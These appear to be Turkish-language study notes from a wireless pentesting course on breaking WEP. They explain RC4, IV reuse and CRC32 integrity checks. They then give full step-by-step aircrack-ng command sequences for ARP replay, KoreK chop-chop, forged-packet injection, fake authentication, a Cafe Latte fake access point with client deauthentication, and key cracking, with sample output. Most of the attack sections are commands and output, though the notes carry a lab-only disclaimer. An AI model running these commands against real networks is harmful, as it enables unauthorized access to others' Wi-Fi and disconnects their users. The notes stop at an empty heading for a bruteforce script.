
# WEP
Bu not [[Wi-Fi Hackleme]] ana notuna aittir.


# Kablosuz Ağ Sızma Testleri: WEP Zafiyetleri ve RC4 Analizi

---

## 1. WEP Nedir ve Temel Zafiyeti Nereden Gelir?
Wired Equivalent Privacy (WEP), kablosuz ağları şifrelemek için kullanılan ancak günümüzde güvensiz kabul edilen eski bir protokoldür. 

**24-bit IV (Initialization Vector) Zafiyeti:**
- WEP, şifreleme için `40-bit` veya `104-bit` uzunluğunda asıl ağ anahtarını (parolayı) kullanır.
- Ancak her paket için rastgele üretilen **Başlatma Vektörü (IV)** her zaman **24-bit** boyutundadır.
- 24-bit çok küçük bir havuz olduğu için, ağda veri aktarımı devam ettikçe bu vektörler hızla **tekrar etmeye (collision)** başlar.
- Alıcı cihazın şifreyi çözebilmesi için IV değeri, veri paketinin ucuna **şifresiz (açık metin)** olarak eklenip yollanmak zorundadır.
- **Sonuç:** Ağ trafiğini dinleyen bir saldırgan (sniffer), şifresiz uçuşan bu IV'ler ile şifreli paketler arasındaki matematiksel korelasyonu çözerek asıl WEP anahtarını bulabilir.

---

## 2. RC4 Şifreleme Algoritması Nasıl Çalışır?
WEP, temelinde simetrik bir akış şifrelemesi (stream cipher) olan **RC4 (Rivest Cipher 4)** algoritmasını kullanır.

Süreç 4 adımda gerçekleşir:
1. **Seed (Tohum) Oluşturma:** `24-bit IV` + `40/104-bit WEP Anahtarı` yan yana birleştirilerek (concatenate) şifreleme tohumu oluşturulur.
2. **KSA (Key Scheduling Algorithm):** Bu tohum algoritmanın iç dizisini başlatır ve değerleri karmaşıklaştırır (permütasyon).
3. **PRGA (Pseudo Random Generation Algorithm):** KSA'dan gelen karışık veriyi işleyerek, şifrelenecek orijinal mesajla birebir aynı uzunlukta rastgele bir **Anahtar Akışı (Keystream)** üretir.
4. **Şifreleme:** Düz metin (orijinal mesaj) ile PRGA'nın ürettiği Keystream **XOR** işlemine sokulur ve ağda iletilecek **Cipher Text (Şifreli Metin)** elde edilir.

---

## 3. WEP Kimlik Doğrulama (Authentication) Türleri
WEP ağlarında iki tür kimlik doğrulama bulunur:

- **Open (Açık):** Cihaz ağa bağlanırken şifre sorulmaz, doğrudan bağlanır (ancak veri iletmek/okumak için arka planda doğru şifreye sahip olması gerekir).
- **Shared (Paylaşılan) - *Zafiyetli Olan*:** 
	1. AP (Erişim Noktası), cihaza şifresiz bir `Challenge` (Meydan Okuma metni) yollar.
	2. Cihaz, bu metni WEP şifresiyle şifreleyip `Challenge Response` olarak geri yollar.
	3. **Pentester Açısı:** Saldırgan havadan bu düz metni ve şifrelenmiş cevabı aynı anda yakalarsa, RC4'ün zafiyeti sayesinde ağın şifresini bilmese dahi AP'yi kandırarak **sahte kimlik doğrulama (fake authentication)** yapabilir.

---

## 4. Kullanılan Saldırı Metodolojileri
- **FMS ve PTW Saldırıları:** Yeterli sayıda IV paketi toplandığında, istatistiksel olasılık hesaplamaları kullanarak asıl şifreyi (WEP Key) geri döndüren algoritmik saldırılardır.
- **Paket Enjeksiyonu (ARP Replay / Fragmentation):** Normalde ağda IV toplayıp şifreyi kırmak uzun sürer. Saldırgan, ağı manipüle edip sürekli sahte ARP paketleri yollayarak (tekrar oynatma), AP'nin çok hızlı bir şekilde yeni IV'ler üretmesini ve sürecin hızlanmasını sağlar.

---

## 5. Python ile WEP Seed Üretimi Kavramsal Simülasyonu
Aşağıdaki Python kodu, WEP'in şifreleme tohumunu nasıl oluşturduğunu ve RC4'ü nasıl başlattığını gösterir.

```python
import Crypto
from Crypto.Random import get_random_bytes
from Crypto.Cipher import ARC4

# 1. Zafiyetli 24-bit (3 byte) IV üretimi (Ağda şifresiz gider)
IV = get_random_bytes(3)

# 2. 40-bit WEP asıl parolası (5 byte)
key = b'\x01\x02\x03\x04\x05'

# 3. Seed (Tohum) oluşturma (IV + Key)
Seed64 = IV + key

# 4. RC4 algoritmasının tohumla başlatılması (KSA aşaması)
keystream = ARC4.new(Seed64)

# 5. Orijinal metnin Keystream ile XOR'lanarak şifrelenmesi (PRGA aşaması)
msg = keystream.encrypt(b'Wired Equivalent Privacy')

print("Rastgele IV:", IV)
print("Şifreli Ağ Paketi (Ciphertext):", msg)

```

# WEP Hata Kontrolü (CRC32) ve KoreK Chop Chop Saldırısı



---

## 1. WEP'te Bütünlük Kontrolü (CRC32 / ICV)
WEP, verinin iletim sırasında bozulup bozulmadığını veya değiştirilip değiştirilmediğini kontrol etmek için **CRC32 (Cyclic Redundancy Check)** algoritmasını kullanır.

- Şifrelenecek orijinal düz metnin (plaintext) standart bir CRC32 özeti (sağlama toplamı) hesaplanır.
- Bu matematiksel değer, bütünlük kontrol mesajı (ICV - Integrity Check Value) olarak düz metnin sonuna iliştirilir.
- `[ Düz Metin + CRC32 ]` bloğu birleştirildikten sonra, RC4 algoritmasının ürettiği **Keystream** ile **XOR** işlemine sokularak ağda iletilecek şifreli paket (Ciphertext) oluşturulur.

---

## 2. KoreK Chop Chop Saldırısı
KoreK Chop Chop, asıl Wi-Fi şifresini (WEP Key) **hiç bilmeden** şifreli bir paketi çözmek için CRC32 doğrulama mekanizmasındaki zafiyeti istismar eden meşhur bir saldırı türüdür.

**Saldırı Adımları:**
1. **Kesme (Chop):** Saldırgan, havadan yakaladığı şifreli paketin sonundan bir baytlık (byte) veriyi kesip çıkarır.
2. **Tahmin ve Hesaplama:** Kesilen bu eksik paket için yeni bir ICV (bütünlük değeri) hesaplayarak paketi modifiye eder.
3. **Ağa Enjekte Etme:** Üzerinde oynanmış bu paketi Erişim Noktasına (AP - Modem) geri gönderir.
4. **Tepki Analizi (Körleme Okuma):** 
   - Eğer AP paketi **kabul ederse**, saldırgan o kestiği baytın gerçek değerini doğru tahmin etmiş demektir.
   - Eğer AP paketi **reddederse** (hata verirse), farklı bir bayt değeri tahminiyle paketi tekrar yollar.
5. **Sonuç:** Saldırgan bu işlemi geriye doğru her bir bayt için tek tek tekrarlayarak, paketin tamamını deneme-yanılma yoluyla deşifre eder.

---

## 3. Python ile CRC32 (ICV) Üretimi Simülasyonu
WEP algoritmasının bütünlük doğrulama adımını Python'daki yerleşik `zlib` kütüphanesi ile pratikte şu şekilde hesaplayabiliriz:

```python
import zlib

# 1. Ağda iletilecek orijinal şifresiz düz metin
packetplaintext = b'Something Sensitive'

# 2. zlib kütüphanesi kullanılarak CRC32 özetinin hesaplanması
crc32 = zlib.crc32(packetplaintext)

# Çıktı olarak 2950664974 gibi eşsiz bir parmak izi değeri üretilir
print("Hesaplanan CRC32 (ICV) Değeri:", crc32)

```

## 4. Tam WEP Algoritmasının Birleştirilmesi (Mockup)

Seed (Tohum) Üretimi ve CRC32 Üretimi betiklerini RC4 kütüphanesiyle birleştirerek eksiksiz bir WEP algoritması simülasyonu oluşturabiliriz. 

Bu birleştirilmiş betikte süreç şu şekilde işler:
1. Başlatma vektörü (IV) ve ağ anahtarı (key) toplanarak **tohum (seed)** oluşturulur.
2. Bu tohum kullanılarak RC4 üzerinden **anahtar akışı (keystream)** üretilir.
3. Düz metnin (packet plaintext) CRC32 sağlama toplamı hesaplanır ve düz metnin sonuna eklenerek şifrelenecek olan mesaj (**ICV Message**) oluşturulur.
4. Elde edilen bu blok, nihai şifreli metni (**Ciphertext**) üretmek üzere RC4'ün şifreleme fonksiyonuna sokulur.
5. Son olarak, başlatma vektörü (IV) bu nihai şifreli metnin en başına eklenir ve ağda iletilecek olan **Son Mesaj (Final Message)** elde edilir.

### Birleştirilmiş Simülasyon Kodu (Python)

```python
import Crypto
from Crypto.Random import get_random_bytes
from Crypto.Cipher import ARC4
import binascii
import zlib

# Öncelikle ağda iletmemiz gereken şifresiz orijinal mesajımızı belirliyoruz.
packetplaintext = b'Something Sensitive'

# Ardından bu mesajın CRC32 sağlama toplamını (32-bit integer) hesaplıyoruz.
crc32 = zlib.crc32(packetplaintext)

# 24-bit Başlatma Vektörü (IV) üretimi (3 byte)
IV = get_random_bytes(3)

# 40-bit anahtar (5 byte) ve 64-bit tohum (8 byte) tanımı
key = b'\x01\x02\x03\x04\x05'
Seed64 = IV + key 

# 104-bit anahtar (13 byte) ve 128-bit tohum tanımı
key104 = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D'
Seed128 = IV + key104 

# Anahtar akışlarının (keystreams) RC4 ile üretilmesi
keystream = ARC4.new(Seed64)
keystreamB = ARC4.new(Seed128)

# ICV Mesajının oluşturulması
crc32byte = crc32.to_bytes(4, 'big')  # CRC32 tamsayısını bayt formatına çeviriyoruz.
ICVMessage = packetplaintext + crc32byte # Orijinal metin ile CRC32 değerini birleştiriyoruz.

# ICV Mesajı ile Keystream'in XOR'lanması sonucu oluşan Nihai Şifreli Metin (Ciphertext)
msg = keystream.encrypt(ICVMessage)
msgB = keystreamB.encrypt(ICVMessage) 

# Başlatma Vektörü (IV) ile Nihai Şifreli Metnin birleştirilmesiyle oluşan Son Mesaj
finalmsg = IV + msg
finalmsgb = IV + msgB

print('-------------')
print('CRC32 Checksum: ' + str(crc32))
print('Initialization Vector: ' + str(IV))
print('64-bit Seed: ' + str(Seed64))
print('128-bit Seed: ' + str(Seed128))
print('-------------')
print('ICV Message: ' + str(ICVMessage))
print('Cipher Text 64-bit Seed: ' + str(msg))
print('Cipher Text 128-bit Seed: ' + str(msgB))
print('-------------')
print('Final Message 64-bit Seed: ' + str(finalmsg))
print('Final Message 128-bit Seed: ' + str(finalmsgb))
```

# Wireshark ve Aircrack-ng ile WEP Ağ Dinleme ve IV Tespiti

Tarih: 2026-11-08

---

## 1. Ağ Dinleme (Sniffing) Hazırlığı
Kablosuz ağ kartını monitör (dinleme) moduna almak ve bağlantıyı bozabilecek süreçleri temizlemek için sırasıyla aşağıdaki komutlar kullanılır:

    # 1. Mevcut kablosuz ağ arayüzlerini listele (örneğin wlan0)
    iwconfig

    # 2. Dinlemeyi kesintiye uğratabilecek arka plan işlemlerini zorla kapat
    sudo airmon-ng check kill

    # 3. Ağ kartını monitör moduna geçir (Arayüz ismi genelde wlan0mon olarak değişir)
    sudo airmon-ng start wlan0

---

## 2. Hedef Tespiti ve Paket Yakalama
Monitör moduna alınan arayüz üzerinden çevredeki ağlar taranır ve hedefe ait veriler .pcap dosyasına kaydedilir:

    # 1. Çevredeki tüm ağları tara (Hedef WEP ağının MAC Adresini ve Kanalını öğrenmek için)
    sudo airodump-ng wlan0mon

    # 2. Sadece belirlenen hedefe odaklan ve trafiği "WEP_Trafik" isimli bir dosyaya kaydet
    # Parametreler:
    # -c      : Hedefin yayın yaptığı kanal (CH)
    # --bssid : Hedef modemin MAC adresi
    # -w      : Çıktı dosyasının ön adı (WEP_Trafik.cap / .pcap olarak kaydeder)
    sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC -w WEP_Trafik wlan0mon

---

## 3. Wireshark ile IV (Başlatma Vektörü) Okuma
Kaydedilen trafik dosyasındaki açık metin (şifresiz) IV değerlerini analiz etmek için terminalden Wireshark başlatılır:

    # Yakalanan veya lab ortamında verilen .pcap dosyasını doğrudan Wireshark ile aç
    wireshark /opt/IV-Wireshark.pcap

Wireshark Arayüzünde IV Bulma Adımları:
1. Listeden incelenecek paketi (örneğin 14 numaralı paketi) bul ve seç.
2. Alt bölümdeki hiyerarşik menüden IEEE 802.11 Data sekmesini genişlet.
3. Onun hemen altındaki WEP Parameters sekmesini genişlet.
4. Initialization Vector (IV) alanında yazan değeri (ör. 0x123456) tespit et.

---

## 4. Ek: Linux Üzerinden Hedef Makineye RDP Bağlantısı
Hack The Box vb. lab ortamlarındaki Windows/Linux hedef makinelerin masaüstüne terminal üzerinden bağlanmak için:

    # Görüntü çökme hatalarını engellemek için sabit ekran boyutu (/size:1280x720) verilir
    xfreerdp /v:10.129.231.119 /u:wifi /p:wifi /size:1280x720


# WEP Cracking: ARP Request Replay Attack

> [!info] Temel Mantık  
> Sadece ağı dinleyerek yeterli IV (Başlatma Vektörü) toplamak çok uzun sürer. Klasik ****ARP Request Replay**** saldırısında, ağdaki geçerli bir ARP isteği yakalanır ve Erişim Noktasına (AP) sürekli tekrar yollanır (replay). AP her isteğe yeni bir IV ile cevap vermek zorunda kalır. Böylece şifreyi kırmak için gereken on binlerce paket birkaç dakika içinde toplanır.

## 1. Hazırlık ve Monitör Modu

Saldırıya başlamadan önce ağ kartı dinleme ve paket enjekte etme moduna (Monitor Mode) alınmalıdır.
```
# Çakışma yaratabilecek arka plan servislerini durdur  
sudo airmon-ng check kill  
  
# Ağ kartını monitör moduna al  
sudo airmon-ng start wlan0  
  
# Modun değiştiğini doğrula (Mode:Monitor yazmalıdır)  
iwconfig
```
## 2. Ağı Tarama ve Paketleri Kaydetme (airodump-ng)

Hedef ağ tespit edilir ve uçuşan veriler (üretilen IV'ler) şifre kırma işleminde kullanılmak üzere bir dosyaya kaydedilir.
```
# Hedefin kanalına (CH) ve MAC adresine (BSSID) kilitlenerek dinlemeyi başlat  
# -w parametresi paketleri WEP-01.cap dosyasına kaydeder  
sudo airodump-ng wlan0mon -c [KANAL_NUMARASI] --bssid [HEDEF_BSSID] -w WEP-01
```


> [!note]  
> Bu komut arka planda sürekli çalışmaya ve veri toplamaya devam etmelidir.

## 3. ARP Paketlerini Tekrarlama / Enjeksiyon (aireplay-ng)

Yeni bir terminal açılarak modeme sahte ARP paketleri yollanır ve ağda yoğun bir trafik yaratılır.

```
# -3: ARP Replay saldırı modu  
# -b: Hedef modemin MAC adresi  
# -h: İstemcinin (Saldırganın) MAC adresi  
sudo aireplay-ng -3 -b [HEDEF_BSSID] -h [SENIN_MAC_ADRESIN] wlan0mon
```


> [!tip]  
> Bu aşamada `airodump-ng` ekranındaki `#Data` sayısı hızla artmaya başlamalıdır.

## 4. WEP Şifresini Kırma (aircrack-ng)

Yeterli paket toplandığında (PTW metodu için genellikle 64-bit şifrelerde ~20.000, 128-bit şifrelerde ~40.000) kaydedilen dosya kırma aracına verilir.

```
# Toplanan IV'leri analiz ederek şifreyi kır  
aircrack-ng -b [HEDEF_BSSID] WEP-01.cap
```
## Notlar

- Aircrack-ng varsayılan olarak ****PTW**** (Pyshkin, Tews, Weinmann) istatistiksel saldırı metodunu kullanır (çok daha hızlıdır).
- Alternatif olarak eski ****Korek/FMS**** saldırısı kullanılmak istenirse komuta `-K` parametresi eklenebilir, ancak bu yöntem şifreyi bulmak için çok daha fazla IV'ye (250.000 – 1.5 milyon) ihtiyaç duyar.
- Bu not yalnızca kendi laboratuvar ağında veya açıkça yetkilendirilmiş ortamlarda eğitim amaçlıdır.


# Korek Chop Chop Attack

Korek Chop Chop Attack (Inverse Arbaugh attack), parçalanma (fragmentation) saldırısına alternatif bir yöntemdir ve ağdaki paketleri şifresini bilmeden bayt bayt çözerek 1500 baytlık bir PRGA (Pseudorandom Generation Algorithm) veri akışı (keystream) elde etmeyi sağlar.

## Saldırı Mantığı
Bu saldırı, WEP'in Bütünlük Kontrol Değeri'ni (Integrity Check Value - ICV) istismar eder. 
- WEP, mesaj bütünlüğünü doğrulamak için CRC32 algoritmasını kullanır.
- Eğer bir paketin ICV'si geçersizse, AP o paketi düşürür (reddeder).
- Saldırgan, yakaladığı geçerli bir paketin son baytını keser (chop) ve yerine 0'dan 255'e kadar tahminler yürüterek yeni bir ICV hesaplar.
- Paket ağa gönderilir; eğer AP paketi düşürürse tahmin yanlıştır, eğer düşürmezse doğru bayt bulunmuş demektir.
- Bu işlem bayt bayt tekrarlanarak paketin düz metin hali ve PRGA anahtarı (keystream) açığa çıkarılır. Elde edilen `.xor` dosyası ile ağda geçerli sahte paketler üretilebilir.

---

## Adım Adım Korek Chop Chop Attack Uygulaması

### 1. Hazırlık ve Monitör Modu
Ağ kartını dinleme moduna (Monitor Mode) alın:
```bash
sudo airmon-ng start wlan0
iwconfig # wlan0mon olduğunu doğrula
```

### 2. Ağı Tarama ve Trafik Kaydı (airodump-ng)
Hedef ağın trafiğini izleyin ve bir dosyaya (örneğin `WEP`) kaydedin. Bu terminal sürekli açık kalmalıdır.
```bash
airodump-ng wlan0mon -c [KANAL] -w WEP
```

### 3. Korek Chop Chop Saldırısını Başlatma (aireplay-ng -4)
İkinci bir terminal açarak saldırıyı başlatın. (Eğer MAC uyumsuzluğu hatası alırsanız `ifconfig wlan0mon hw ether [ISTEMCI_MAC]` ile MAC adresini güncelleyin.)
```bash
# -4: Korek Chop Chop saldırısı
sudo aireplay-ng -4 -b [HEDEF_BSSID] -h [ISTEMCI_MAC] wlan0mon
```
- Ekranda bir paket bulunduğunda (`Use this packet ?`) uygun boyuttaki paket için `y` diyerek onaylayın.
- Araç, paketi bayt bayt çözecektir. İşlem tamamlandığında `replay_dec-[TARIH].cap` (düz metin) ve `replay_dec-[TARIH].xor` (keystream) dosyaları oluşturulur.

### 4. Gerçek IP Adreslerini Tespit Etme (tcpdump)
Chop Chop saldırısıyla çözülen paketin içindeki gerçek Kaynak (Source) ve Hedef (Destination) IP adreslerini bulmak için oluşturulan `.cap` dosyasını okuyun:
```bash
tcpdump -s 0 -n -e -r replay_dec-[TARIH].cap
```
- Çıktıda `192.168.x.x > 192.168.y.y` formatında IP adresleri görünecektir. Bu adresleri not alın.

### 5. Sahte ARP Paketi Üretme (packetforge-ng)
Elde edilen IP adresleri ve `.xor` dosyası kullanılarak ağa enjekte edilecek sahte ARP isteğini oluşturun:
```bash
# -k: AP (Modem) IP Adresi
# -l: İstemci IP Adresi
packetforge-ng -0 -a [HEDEF_BSSID] -h [ISTEMCI_MAC] -k [AP_IP] -l [ISTEMCI_IP] -y replay_dec-[TARIH].xor -w forgedarp.cap
```

### 6. Paketi Ağa Enjekte Etme (aireplay-ng -2)
Oluşturulan `forgedarp.cap` paketini ağa fırlatarak (Interactive Packet Replay) yoğun IV üretilmesini sağlayın.
```bash
# -2: Interactive Packet Replay
sudo aireplay-ng -2 -r forgedarp.cap -h [ISTEMCI_MAC] wlan0mon
```
*(Ekranda `Use this packet?` sorusuna `y` diyerek onay verin. İsteğe bağlı olarak süreci hızlandırmak için yeni bir terminalde `aireplay-ng -3` ile ARP Request Replay saldırısı da başlatılabilir).*

### 7. WEP Şifresini Kırma (aircrack-ng)
`airodump-ng` ekranındaki `#Data` (veya IV) sayısı yeterli seviyeye ulaştığında (genellikle 20.000+), kaydedilen ana `.cap` dosyası üzerinden şifreyi kırın:
```bash
aircrack-ng -b [HEDEF_BSSID] WEP-01.cap
```
İşlem başarılı olduğunda şifre `KEY FOUND! [ XX:XX:XX:XX:XX ]` formatında ekranda belirecektir.



# Cafe Latte Attack

Cafe Latte saldırısı, WEP istemcilerinin yeniden kimlik doğrulama (reauthentication) isteklerini nasıl işlediğini istismar eder. Ağda ARP trafiği üreten hiçbir aktif istemci olmadığında (örneğin Fragmentation veya Korek Chop Chop saldırılarının işe yaramadığı durumlarda) doğrudan istemcileri (client) hedef alarak WEP şifresini kırmak için yeterli IV (Başlatma Vektörü) toplamayı sağlar.

## Saldırı Mantığı
- Cafe Latte, bağlı istemcilere yönelik bir ARP Request Replay saldırısı varyasyonudur ve WEP için bir "Evil Twin" (Kötü İkiz) saldırısına benzetilebilir.
- Hedef ağ ile aynı BSSID'ye ve ESSID'ye sahip, WEP modunda çalışan sahte bir Erişim Noktası (Access Point) oluşturulur.
- İstemciler hedef ağdan koparılır (deauthentication) ve sahte erişim noktasına bağlanmaya zorlanır.
- Bu bağlantı sırasında yakalanan ARP paketleri, WEP anahtarını kırmak için gereken IV'leri toplamak amacıyla sürekli olarak tekrar oynatılır (replay).
- **Not:** Bu saldırıyı başarılı bir şekilde gerçekleştirmek için **dört ayrı terminal** gereklidir.

---

## Adım Adım Cafe Latte Attack Uygulaması

### 1. Hazırlık ve Monitör Modu
Ağ kartını dinleme moduna (Monitor Mode) alın ve çakışan süreçleri durdurun:
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
iwconfig # wlan0mon olduğunu doğrula
```

### 2. Ağı Tarama ve Trafik Kaydı (airodump-ng)
**Birinci Terminal:** Hedef ağın trafiğini izleyin ve bir dosyaya kaydedin.
```bash
airodump-ng wlan0mon -c [KANAL_NUMARASI] -w WEP
```
*(Bu ekrandan hedef AP'nin BSSID'sini ve bağlı olan istemcinin MAC adresini not alın.)*

### 3. Cafe Latte Dinleyicisini Başlatma (aireplay-ng -6)
**İkinci Terminal:** İstemcinin bağlanmasını bekleyecek ve yakalanan ARP isteklerini istemciye tekrar yollayacak (replay) olan dinleyiciyi başlatın.
```bash
# -6: Cafe Latte saldırı modu
# -b: Hedef AP BSSID
# -h: İstemci MAC Adresi
aireplay-ng -6 -D -b [HEDEF_BSSID] -h [ISTEMCI_MAC] wlan0mon
```
*(MAC eşleşmeme hatası alırsanız, `ifconfig wlan0mon hw ether [ISTEMCI_MAC]` ile kartınızın MAC adresini geçici olarak değiştirin.)*

### 4. Sahte Erişim Noktası (Fake AP) Oluşturma (airbase-ng)
**Üçüncü Terminal:** Ağdan koparılacak istemciyi kandırmak için hedef ağın birebir kopyası olan sahte bir AP oluşturun.
```bash
# -a: Hedef AP BSSID
# -e: Hedef AP Adı (ESSID)
# -W 1: WEP modunu etkinleştir
# -L: Cafe Latte saldırı modunu başlat
airbase-ng -c [KANAL_NUMARASI] -a [HEDEF_BSSID] -e "Hedef_Ağ_Adı" wlan0mon -W 1 -L
```

### 5. İstemciyi Ağdan Koparma / Deauthentication (aireplay-ng -0)
**Dördüncü Terminal:** İstemciyi gerçek ağdan düşürerek sahte AP'mize (üçüncü terminal) bağlanmaya zorlayın.
```bash
# -0 10: 10 adet Deauth paketi yolla
aireplay-ng -0 10 -a [HEDEF_BSSID] -c [ISTEMCI_MAC] wlan0mon
```

### 6. Sürecin Doğrulanması
Deauth saldırısı başarılı olduğunda:
- **Üçüncü terminalde (airbase-ng):** İstemcinin sahte ağa bağlandığını (Client associated) ve Caffe-Latte saldırısının başladığını göreceksiniz.
- **İkinci terminalde (aireplay-ng -6):** Yakalanan ve tekrar yollanan ARP paketlerinin sayısı (Read/Sent packets) hızla artmaya başlayacaktır.

### 7. WEP Şifresini Kırma (aircrack-ng)
Birinci terminaldeki (`airodump-ng`) `#Data` sayısı yeterli bir seviyeye ulaştığında (genellikle 20.000 - 40.000+), kaydedilen dosya üzerinden şifreyi kırın:
```bash
aircrack-ng -b [HEDEF_BSSID] WEP-01.cap
```
İşlem başarılı olduğunda şifre `KEY FOUND! [ XX:XX:XX:XX:XX ]` formatında ekranda belirecektir.

---

### Sorun Giderme Notları
* **ARP Paketi Üretilmiyorsa:** Deauthentication saldırısını (`aireplay-ng -0`) tekrarlayın ve hemen ardından sahte AP (`airbase-ng`) komutunu yeniden çalıştırın.
* **Ağda Hiç İstemci Yoksa:** Cafe Latte saldırısı bir istemciye ihtiyaç duyar. Ağda istemci yoksa, `aireplay-ng -1` ile AP'ye sahte kimlik doğrulaması (fake authentication) yapıp Fragmentation veya Korek Chop Chop saldırılarına yönelmek gerekir.



# WEP Erişim Noktalarına İstemcisi Olmadan Saldırı

## Genel Bakış ve Önkoşullar

- **Hedef Senaryo:** Kablosuz istemcisi **bulunmayan** ve Ethernet bağlantılı istasyonlardan ARP isteği gelmeyen WEP şifreli ağlar.
    
- **Saldırı Stratejisi:** Sahte kimlik doğrulama (fake authentication) ile kombinasyon halinde özel bir **Fragmentation** veya **KoreK Chop-Chop** saldırısı gerçekleştirilir.
    
- **Etkinlik:** Bazı ağlarda çalışsa da evrensel olarak etkili değildir; tamamen ağın sahte kimlik doğrulamasına karşı savunmasız olup olmadığına bağlıdır.
    
- **Terminal Gereksinimi:** Bu saldırı için **üç ayrı terminale** ihtiyacımız var.
    

## Adım Adım Uygulama

### 1. Terminal: Tarama ve Paket Yakalama

İlk terminalde hedef ağı tarıyor ve iletişimlerini `airodump-ng` kullanarak kaydediyoruz.

```
sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP
```

_Örnek Çıktı:_

```
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID 
60:38:E0:71:E9:DC  -47 100     2825       44    0   3   11   WEP  WEP         Virt-Corp
```

### 2. Terminal: Sahte Kimlik Doğrulama (Fake Authentication)

İkinci terminalde paket oluşturma girişimlerini başlatıyoruz. Bu işlem, arayüzümüzün MAC adresini kullanarak erişim noktasıyla kimlik doğrulamayı içerir.

- `-1`: Sahte kimlik doğrulamayı belirtir.
    
- `1000`: Yeniden ilişkilendirme aralığı.
    
- `-o 1`: Aynı anda yalnızca bir paket seti gönderir.
    
- `-q 5`: Keep-alive (bağlantıda kalma) istek aralığı.
    
- `-e`: Ağın ESSID'si.
    
- `-a`: BSSID adresi.
    
- `-h`: Kendi MAC adresimiz.
    

```
aireplay-ng -1 1000 -o 1 -q 5 -e HTB-Wireless -a 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon
```

_Çıktı:_

```
Sending Authentication Request
Authentication successful
Sending Association Request
Association successful :-)
```

> _Not: Saldırgan olarak kendi arayüzümüzün MAC adresini (`00:c0:ca:98:3e:e0`) sağlıyoruz._

`airodump-ng` çıktısında, MAC adresimizin AP'ye bağlı bir istemci olarak görünmesiyle sahte kimlik doğrulamanın başarılı olduğunu onaylayabiliriz.

### 3. Terminal: KoreK Chop-Chop / Fragmentation Saldırısı

Üçüncü bir terminalde fragmentation veya KoreK chop-chop saldırısı başlatıyoruz. KoreK chop-chop saldırısını başlatmak için kullanılan komut:

```
aireplay-ng -4 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon
```

_Çıktı Parçası:_

```
Read 667 packets...        Size: 392, FromDS: 1, ToDS: 0 (WEP)              
BSSID  =  60:38:E0:71:E9:DC          
Dest. MAC  =  00:c0:ca:98:3e:e0         
Source MAC  =  60:38:E0:71:E9:DC
Use this packet ? y
Offset  389 ( 0% done) | xor = 9A | pt = AF |   58 frames written in  1067ms
...
Saving plaintext in replay_dec-1229-160018.cap
Saving keystream in replay_dec-1229-160018.xor
```

### Paket Oluşturma ve Enjeksiyon (Packetforge-ng)

PRGA keystream'i başarılı bir şekilde `.xor` dosyasına kaydettikten sonra, istasyonu olmayan bir ağa enjekte etmek üzere paket oluşturmak için `packetforge-ng` kullanıyoruz.

- `-0`: ARP paketi oluşturma modu
    
- `-a`: Erişim noktası MAC adresi
    
- `-h`: İlişkilendirilmiş arayüz MAC adresi
    
- `-k`: Tahmini hedef IP
    
- `-l`: Tahmini kaynak IP
    
- `-y`: Replay dosyası (`.xor`)
    
- `-w`: Yazma hedefi (`.cap`)
    

_(IP'yi bilmiyorsak `255.255.255.0` veya `255.255.255.255` kullanabiliriz)._

```
packetforge-ng -0 -a 60:38:e0:71:e9:dc -h 00:c0:ca:98:3e:e0 -k 192.168.1.1 -l 192.168.1.64 -y replay_dec-1229-160018.xor -w forgedarp.cap
```

Artık sahte bir ARP paketimiz olduğuna göre, onu ağa geri enjekte edebiliriz:

```
aireplay-ng -2 -r forgedarp.cap wlan0mon
```

### Anahtarın Kırılması (Aircrack-ng)

Bu işlem sürerken, başlatma vektörleri (IV) üretilirken birkaç dakika bekliyoruz. Süreci hızlandırmak için daha önce yaptığımız gibi bir ARP isteği replay saldırısı da başlatabiliriz. Yeterli trafik üretildiğinde, varsayılan PTW yöntemini kullanarak anahtarı kırmaya çalışabiliriz:

```
sudo aircrack-ng -b 60:38:E0:71:E9:DC WEP-01.cap
```

_Başarılı Çıktı:_

```
Aircrack-ng 1.7                                    
[00:00:00] Tested 2 keys (got 26962 IVs)   
KB    depth   byte(vote)    
0    0/  1   26(36352) C7(35328) 2B(34560) 6D(33024) B2(32512) 06(32000) 28(32000) D7(32000)     
...
KEY FOUND! [ 26:27:F6:85:97 ]         
Decrypted correctly: 100%
```

> **Önemli Not:** Sahte kimlik doğrulama, çoğunlukla yalnızca eski yönlendiricilerde (routers) etkilidir; çünkü daha yeni yönlendiriciler sahte kimlik doğrulama ile bağlandıklarında yayın (broadcast) istekleri üretmezler.



# Ek WEP Kırma Yöntemleri ve Çevrimdışı Kaba Kuvvet (Bruteforce)

## 📌 Genel Bakış

Standart WEP kırma yöntemlerinde `airodump-ng` ile yeterli sayıda şifrelenmiş paket (IV - Başlatma Vektörü) toplanır ve `aircrack-ng` ile şifre çözülür. Ancak ağda yeterli trafik yoksa ve yeterli paket toplanamıyorsa, **Çevrimdışı Kaba Kuvvet (Bruteforce)** veya **KoreK istatistiksel saldırısı** gibi alternatif yöntemlere başvurulur.

## 1. KoreK Yöntemi ile WEP Kırma

Eğer elimizde tüm ağ trafiği yerine sadece Başlatma Vektörlerinin (IVs) kaydedildiği bir `.ivs` dosyası varsa, Aircrack-ng'nin KoreK istatistiksel yöntemini kullanarak şifreyi kırabiliriz.

```
# Sadece .ivs uzantılı dosyaları kullanarak kırma işlemi
aircrack-ng -K /opt/WEP.ivs
```

_(İşlem başarılı olduğunda ekranda `KEY FOUND! [ XX:XX:XX:XX:XX ]` şeklinde WEP anahtarı belirecektir.)_

## 2. Python ve Airdecap-ng ile Kaba Kuvvet (Bruteforce) Saldırısı

Eğer elimizde `.cap` dosyasında (örneğin sadece 7-9 paket gibi) çok az veri varsa, Aircrack-ng standart yöntemlerle bu şifreyi çözemez. Bu durumda bir sözlük listesi (wordlist) kullanarak her parolayı tek tek deneyen bir Python betiği yazabiliriz.

Bu betik, sözlükteki kelimeleri alır, WEP formatına (Hexadecimal) çevirir ve `airdecap-ng` aracı ile paketi çözmeyi dener. Eğer paket başarıyla çözülürse, doğru şifreyi bulmuşuz demektir.

### 🛠️ Adım 1: Python Betiğini Oluşturma

Terminalde yeni bir Python dosyası açıyoruz:

```
nano bruteforce.py
```

### 💻 Adım 2: Kaba Kuvvet Kodları

